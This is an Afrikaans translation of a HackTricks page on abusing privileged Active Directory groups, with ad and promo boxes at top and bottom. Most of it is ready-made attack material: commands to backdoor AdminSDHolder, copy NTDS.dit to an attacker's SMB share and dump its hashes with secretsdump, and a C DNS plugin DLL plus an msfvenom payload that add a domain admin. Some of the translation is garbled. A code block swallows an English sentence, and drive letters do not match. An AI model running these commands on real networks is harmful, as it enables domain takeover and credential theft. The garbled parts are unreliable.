# Bevoorregte Groepe

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## Bekende groepe met administratiewe voorregte

* **Administrators**
* **Domain Admins**
* **Enterprise Admins**

## Rekeningoperateurs

Hierdie groep is gemagtig om rekeninge en groepe te skep wat nie administrateurs op die domein is nie. Daarbenewens maak dit plaaslike aanmelding by die Domeinbeheerder (DC) moontlik.

Om die lede van hierdie groep te identifiseer, word die volgende opdrag uitgevoer:
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Die byvoeg van nuwe gebruikers is toegelaat, sowel as plaaslike aanmelding by DC01.

## AdminSDHolder-groep

Die **AdminSDHolder**-groep se Toegangbeheerlys (ACL) is van kritieke belang, aangesien dit toestemmings stel vir alle "beskermde groepe" binne Active Directory, insluitend hoë-voorreggroep. Hierdie meganisme verseker die veiligheid van hierdie groepe deur ongemagtigde wysigings te voorkom.

'n Aanvaller kan dit uitbuit deur die ACL van die **AdminSDHolder**-groep te wysig en volle toestemmings aan 'n standaardgebruiker te verleen. Dit sal hierdie gebruiker effektief volle beheer oor alle beskermde groepe gee. As hierdie gebruiker se toestemmings gewysig of verwyder word, sal dit binne 'n uur outomaties herstel word as gevolg van die stelsel se ontwerp.

Opdragte om die lede te hersien en toestemmings te wysig, sluit in:
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
'n Skrip is beskikbaar om die herstelproses te versnel: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Vir meer besonderhede, besoek [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Herwin Binne

Lidmaatskap in hierdie groep maak dit moontlik om uitgevee Active Directory-voorwerpe te lees, wat sensitiewe inligting kan onthul:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Toegang tot domeinbeheerder

Toegang tot bestanden op de DC is beperk, tensy die gebruiker deel is van die `Server Operators`-groep, wat die vlak van toegang verander.

### Privilege-escalasie

Deur `PsService` of `sc` van Sysinternals te gebruik, kan 'n persoon diensmachtigings ondersoek en wysig. Die `Server Operators`-groep het byvoorbeeld volle beheer oor sekere dienste, wat die uitvoering van willekeurige opdragte en privilege-escalasie moontlik maak:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Hierdie bevel onthul dat `Server Operators` volle toegang het, wat die manipulasie van dienste vir verhoogde bevoegdhede moontlik maak.

## Backup Operators

Lidmaatskap in die `Backup Operators` groep bied toegang tot die `DC01` lêersisteem as gevolg van die `SeBackup` en `SeRestore` bevoegdhede. Hierdie bevoegdhede maak vouer deursoeking, lys en lêerkopieer-vermoëns moontlik, selfs sonder uitdruklike toestemmings, deur die gebruik van die `FILE_FLAG_BACKUP_SEMANTICS` vlag. Die gebruik van spesifieke skripte is nodig vir hierdie proses.

Om groeplede te lys, voer uit:
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Plaaslike Aanval

Om hierdie voorregte plaaslik te benut, word die volgende stappe gevolg:

1. Voer nodige biblioteke in:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Aktiveer en verifieer `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Toegang en kopieer lêers vanaf beperkte gidsies, byvoorbeeld:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Aanval

Direkte toegang tot die lêersisteem van die Domeinbeheerder maak dit moontlik om die `NTDS.dit` databasis te steel, wat al die NTLM-hashes vir domein gebruikers en rekenaars bevat.

#### Gebruik van diskshadow.exe

1. Skep 'n skadukopie van die `C`-aandrywing:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Kopieer `NTDS.dit` vanaf die skadukopie:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternatiewelik, gebruik `robocopy` vir lêerkopiëring:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Haal `SYSTEM` en `SAM` uit vir hashtrekking:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Haal alle hasings uit `NTDS.dit` op:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### Gebruik van wbadmin.exe

1. Stel NTFS-lêersisteem op vir SMB-bediener op aanvaller se masjien en stoor SMB-legitimasie op teikengreepmasjien.
2. Gebruik `wbadmin.exe` vir stelselrugsteun en `NTDS.dit`-onttrekking:
```cmd
net use X: \\<AanvalIP>\deelnaam /user:smbgebruiker wagwoord
echo "Y" | wbadmin start backup -backuptarget:\\<AanvalIP>\deelnaam -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<datum-tyd> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Vir 'n praktiese demonstrasie, sien [DEMO VIDEO MET IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Lede van die **DnsAdmins**-groep kan hul voorregte benut om 'n willekeurige DLL met SISTEEM-voorregte op 'n DNS-bediener te laai, wat dikwels op Domeinbeheerders gehuisves word. Hierdie vermoë bied aansienlike uitbuitingspotensiaal.

Om lede van die DnsAdmins-groep te lys, gebruik:
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Voer willekeurige DLL uit

Lede kan die DNS-bediener dwing om 'n willekeurige DLL te laai (plaaslik of van 'n afgeleë deel) deur gebruik te maak van opdragte soos:
```powershell
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Die herlaai van die DNS-diens (wat moontlik addisionele toestemmings vereis) is noodsaaklik vir die DLL om gelaai te word:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Vir meer besonderhede oor hierdie aanvalsmetode, verwys na ired.team.

#### Mimilib.dll
Dit is ook moontlik om mimilib.dll te gebruik vir opdraguitvoering deur dit te wysig om spesifieke opdragte of omgekeerde skulpe uit te voer. [Kyk na hierdie pos](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) vir meer inligting.

### WPAD-rekord vir MitM
DnsAdmins kan DNS-rekords manipuleer om Man-in-the-Middle (MitM) aanvalle uit te voer deur 'n WPAD-rekord te skep nadat die globale navraagbloklys gedeaktiveer is. Hulpmiddels soos Responder of Inveigh kan gebruik word vir vervalsing en die vaslegging van netwerkverkeer.

### Event Log Lesers
Lede kan toegang verkry tot gebeurtenislogs en moontlik sensitiewe inligting vind, soos platte teks wagwoorde of opdraguitvoeringsbesonderhede:
```powershell
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Uitruil van Windows-toestemmings
Hierdie groep kan DACL's op die domeinobjek wysig en moontlik DCSync-voorregte verleen. Tegnieke vir voorregverhoging wat hierdie groep uitbuit, word in die Exchange-AD-Privesc GitHub-opslagplek in detail beskryf.
```powershell
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V Administrateurs
Hyper-V Administrateurs het volle toegang tot Hyper-V, wat uitgebuit kan word om beheer oor gevirtualiseerde Domein Kontroleerders te verkry. Dit sluit die kloning van lewendige DC's en die onttrekking van NTLM-hashes uit die NTDS.dit-lêer in.

### Exploitasie Voorbeeld
Firefox se Mozilla Maintenance Service kan deur Hyper-V Administrateurs uitgebuit word om opdragte as SYSTEM uit te voer. Dit behels die skep van 'n harde skakel na 'n beskermde SYSTEM-lêer en dit te vervang met 'n skadelike uitvoerbare lêer:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Nota: Hardlink-uitbuiting is in onlangse Windows-opdaterings geminimaliseer.

## Organisasiebestuur

In omgewings waar **Microsoft Exchange** geïmplementeer is, het 'n spesiale groep genaamd **Organisasiebestuur** aansienlike bevoegdhede. Hierdie groep het die voorreg om **toegang te verkry tot die posbusse van alle domein-gebruikers** en behou **volle beheer oor die 'Microsoft Exchange Security Groups'** Organisasie-eenheid (OU). Hierdie beheer sluit die **`Exchange Windows Permissions`** groep in, wat uitgebuit kan word vir bevoorregte eskalasie.

### Bevoorregte Uitbuiting en Opdragte

#### Drukkersoperateurs
Lede van die **Drukkersoperateurs**-groep het verskeie bevoegdhede, insluitend die **`SeLoadDriverPrivilege`**, wat hulle in staat stel om **plaaslik aan te meld by 'n Domeinbeheerder**, dit af te skakel en drukkers te bestuur. Om hierdie bevoegdhede uit te buit, veral as **`SeLoadDriverPrivilege`** nie sigbaar is onder 'n nie-verhoogde konteks nie, is dit nodig om Gebruikersrekeningbeheer (UAC) te omseil.

Om die lede van hierdie groep te lys, word die volgende PowerShell-opdrag gebruik:
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Vir meer gedetailleerde uitbuitingstegnieke wat verband hou met **`SeLoadDriverPrivilege`**, moet jy spesifieke sekuriteitsbronne raadpleeg.

#### Remote Desktop-gebruikers
Lede van hierdie groep het toegang tot rekenaars via die Remote Desktop Protocol (RDP). Om hierdie lede op te som, is daar beskikbare PowerShell-opdragte:
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Verdere insigte oor die uitbuiting van RDP kan gevind word in toegewyde pentesting-bronne.

#### Remote-bestuursgebruikers
Lede kan toegang verkry tot rekenaars via **Windows Remote Management (WinRM)**. Enumerasie van hierdie lede word bereik deur middel van:
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Vir uitbuitingstegnieke wat verband hou met **WinRM**, moet spesifieke dokumentasie geraadpleeg word.

#### Bedieningsoperateurs
Hierdie groep het toestemmings om verskeie konfigurasies op Domeinbeheerders uit te voer, insluitend rugsteun- en herstelregte, verandering van stelseltyd en afsluiting van die stelsel. Om die lede op te som, word die volgende opdrag verskaf:
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Verwysings <a href="#verwysings" id="verwysings"></a>

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
* [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
* [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
* [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
* [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
* [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
* [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
* [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>
